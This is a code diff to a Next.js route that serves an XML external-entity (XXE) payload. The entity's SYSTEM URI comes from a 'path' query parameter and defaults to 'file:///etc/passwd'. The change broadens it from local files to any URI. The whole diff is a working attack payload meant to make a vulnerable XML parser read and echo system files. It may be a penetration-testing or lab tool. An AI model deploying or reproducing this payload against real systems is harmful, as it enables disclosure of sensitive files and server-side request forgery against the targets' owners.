@@ -3,11 +3,11 @@ import { NextRequest } from "next/server";
 const xml = `
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE p [
-  <!ENTITY data SYSTEM "file://{{file}}">
+  <!ENTITY data SYSTEM "{{path}}">
 ]>
-<p>
-{{file}}
-
+<p id="data">
+{{path}}
+「All-Seeing 👀」
 &data;
 </p>
 `.trim();
@@ -15,8 +15,8 @@ const xml = `
 export async function GET(request: NextRequest) {
   return new Response(
     xml.replaceAll(
-      "{{file}}",
-      request.nextUrl.searchParams.get("file") ?? "/etc/passwd"
+      "{{path}}",
+      request.nextUrl.searchParams.get("path") ?? "file:///etc/passwd"
     ),
     {
       status: 200,
